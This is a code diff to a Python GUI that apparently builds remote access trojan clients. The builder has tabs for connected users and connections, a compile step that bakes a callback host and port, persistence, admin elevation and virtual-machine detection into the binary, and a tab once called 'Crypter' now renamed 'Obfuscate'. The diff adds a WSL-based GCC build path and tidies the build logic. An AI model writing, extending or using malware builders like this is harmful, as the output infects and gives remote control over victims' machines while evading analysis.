@@ -87,7 +87,7 @@ class FrameTabCompile(ck.CTkFrame):
         self.label_entry_compiler = ck.CTkLabel(self, text='Compiler')
         self.entry_compiler = ck.CTkOptionMenu(
             self,
-            values=['PyInstaller', 'GCC']
+            values=['PyInstaller', 'MinGW-64 GCC', 'WSL Ubuntu GCC']
         )
 
         self.label_entry_host = ck.CTkLabel(self, text='Host')
@@ -285,9 +285,6 @@ class Application(ck.CTk):
     ck.set_appearance_mode(APPARENCE)
     ck.set_default_color_theme(COLOR_THEME)
 
-    working_dir = os.path.join(os.getcwd(), "source")
-    dist_dir = os.path.join(working_dir, "dist")
-
     def __init__(self, title, *args, **kwargs):
         super().__init__(*args, **kwargs)
 
@@ -303,6 +300,9 @@ class Application(ck.CTk):
         self.geometry("%dx%d+%d+%d" % (w, h, x, y))
         self.grid_columnconfigure(0, weight=1)
 
+        self.working_dir = os.path.join(os.getcwd(), "source")
+        self.dist_dir = os.path.join(self.working_dir, "dist")
+
         # Tabs
         self.tab_view = ck.CTkTabview(self)
         self.tab_view.pack(fill=ck.BOTH, expand=True)
@@ -311,7 +311,7 @@ class Application(ck.CTk):
         self.tab_users = self.tab_view.add("Users")
         self.tab_connections = self.tab_view.add("Conections")
         self.tab_compile = self.tab_view.add("Compile")
-        self.tab_crypter = self.tab_view.add("Crypter")
+        self.tab_obfuscate = self.tab_view.add("Obfuscate")
 
         # Tab Settings
         self.tab_view.label_apparence_mode = ck.CTkLabel(self.tab_settings, text=APPARENCE)
@@ -384,6 +384,8 @@ class Application(ck.CTk):
         self.tab_view.dist_folder.pack(padx=2, pady=10, fill=ck.BOTH, expand=True)
         self.update_dist_folder()
 
+        # Tab Obfuscate
+        
     def __repr__(self):
         return f"App {self.title_str}"
 
@@ -699,7 +701,7 @@ class Application(ck.CTk):
             with open(f'{working_dir}\\config\\compiler_config.py', 'w') as config:
                 config.write(writer)
 
-        elif compiler == 'GCC':
+        elif compiler == 'MinGW-64 GCC':
             writer = (
                 f'#define HOST "{host}"\n'
                 f'#define PORT {port or 555}\n'
@@ -708,7 +710,7 @@ class Application(ck.CTk):
                 f'#define ADMIN {admin.lower() or "False"}\n'
                 f'#define DETECT_VM {detect.lower() or "False"}\n'
             )
-            args = ["gcc", os.path.join(working_dir, source_file), "-o", os.path.join(dist_dir, filename)]
+            args = ["gcc", "-v", os.path.join(working_dir, source_file), "-o", os.path.join(dist_dir, filename)]
             if eval(admin):
                 for arg in [
                     ';', 'mt.exe', '-manifest', f'{working_dir}\\config\\manifest.xml',
@@ -717,6 +719,28 @@ class Application(ck.CTk):
                     args.append(arg)
 
             with open(f'{working_dir}\\config\\compiler_config.h', 'w') as config:
+                config.write(writer)
+        elif compiler == 'WSL Ubuntu GCC':
+            writer = (
+                f'#define HOST "{host}"\n'
+                f'#define PORT {port or 555}\n'
+                f'#define ACTIVATE {activate.lower() or "False"}\n'
+                f'#define PERSIST {autorun.lower() or "False"}\n'
+                f'#define ADMIN {admin.lower() or "False"}\n'
+                f'#define DETECT_VM {detect.lower() or "False"}\n'
+            )
+
+            os_unit = os.path.splitdrive(os.getcwd())[0]
+            rep_unit = os_unit.replace(':', '').lower()
+            working_dir = f"/mnt/{working_dir.replace(os_unit, rep_unit).replace('\\', '/')}"
+            dist_dir = f"/mnt/{dist_dir.replace('C:', 'c').replace('\\', '/')}"
+
+            args = ["wsl", "-d", "Ubuntu", "gcc", "-v", os.path.join(working_dir, source_file).replace('\\', '/'), "-o", os.path.join(dist_dir, filename).replace('\\', '/')]
+
+            if eval(admin):
+                pass
+
+            with open(f'{self.working_dir}\\config\\compiler_config.h', 'w') as config:
                 config.write(writer)
         else:
             raise ValueError("Compiler not found.")
@@ -742,32 +766,15 @@ class Application(ck.CTk):
                 shutil.rmtree(f"{working_dir}\\build")
                 os.remove(os.path.join(dist_dir, f'{filename}.spec'))
             except FileNotFoundError:
-                pass
-            warning = f"REMOVED TREE: {working_dir}\\build. \nREMOVED: {os.path.join(dist_dir, f'{filename}.spec')}"
+                warning = ""
+            else:
+                warning = f"REMOVED TREE: {working_dir}\\build. \nREMOVED: {os.path.join(dist_dir, f'{filename}.spec')}"
             self.toplevel_warning.after(50, self.toplevel_warning.insert_warning, [warning])
             self.toplevel_warning.after(50, self.update_dist_folder())
 
         process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
         thread = threading.Thread(target=read_output, args=(process,), daemon=True)
         thread.start()
-        # thread.join()
-
-        # time.sleep(1)
-        # try:
-        #     proc = subprocess.run(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        #     out, err = proc.communicate()
-        #     pass
-        # except Exception as e:
-        #     print(e)
-        # else:
-        #     self.toplevel_warning.after(50, self.toplevel_warning.insert_warning, [out, err])
-        #     try:
-        #         shutil.rmtree(f"{working_dir}\\build")
-        #         os.remove(os.path.join(dist_dir, f'{filename}.spec'))
-        #     except FileNotFoundError:
-        #         pass
-        #     warning = f"REMOVED TREE: {working_dir}\\build. \nREMOVED: {os.path.join(dist_dir, f'{filename}.spec')}"
-        #     self.toplevel_warning.after(50, self.toplevel_warning.insert_warning, [warning])
 
 
 if __name__ == '__main__':
